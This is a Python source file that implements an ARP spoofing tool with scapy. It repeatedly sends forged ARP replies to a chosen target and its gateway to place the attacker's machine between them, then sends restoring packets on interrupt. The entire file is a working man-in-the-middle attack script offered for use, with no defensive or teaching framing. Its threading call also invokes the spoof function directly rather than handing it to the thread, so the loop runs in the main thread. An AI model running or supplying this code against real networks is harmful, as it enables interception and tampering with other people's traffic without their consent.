from scapy.all import ARP, send
from Device import Device
import threading
import time


def build_arp(fn):
    def wrapper(self):
        pckt = ARP()
        pckt.op = 2
        fn(self, pckt)
        print(pckt.command())
        send(pckt)
    return wrapper


class ARPSpoofer(object):
    def set_target(self, target_ip):
        self.target = Device(target_ip)

    def set_gateway(self, gateway_ip):
        self.gateway = Device(gateway_ip)

    def spoof(self):
        spoof_thread = threading.Thread(
            target=self.__make_spoof()
        )
        spoof_thread.start()

    def __make_spoof(self):
        print("Start Spoofing ")
        print("Target: ".upper())
        print(self.target)
        print("Gateway: ".upper())
        print(self.gateway)

        shouldSpoof = True

        while shouldSpoof:
            try:
                self.__spoof_target()
                self.__spoof_gateway()
                time.sleep(3)
            except KeyboardInterrupt:
                shouldSpoof = False
                for i in range(5):
                    self.__clean_target()
                    self.__clean_gateway()
                    time.sleep(1)
        print("Spoofer finish")

    @build_arp
    def __spoof_target(self, pckt):
        pckt.pdst = self.target.ip
        pckt.hwdst = self.target.addr
        pckt.psrc = self.gateway.ip

    @build_arp
    def __spoof_gateway(self, pckt):
        pckt.pdst = self.gateway.ip
        pckt.hwdst = self.gateway.addr
        pckt.psrc = self.target.ip

    @build_arp
    def __clean_target(self, pckt):
        pckt.pdst = self.target.ip
        pckt.hwdst = "ff:ff:ff:ff:ff:ff"
        pckt.psrc = self.gateway.ip
        pckt.hwsrc = self.gateway.addr

    @build_arp
    def __clean_gateway(self, pckt):
        pckt.pdst = self.gateway.ip
        pckt.hwdst = "ff:ff:ff:ff:ff:ff"
        pckt.psrc = self.target.ip
        pckt.hwsrc = self.target.addr
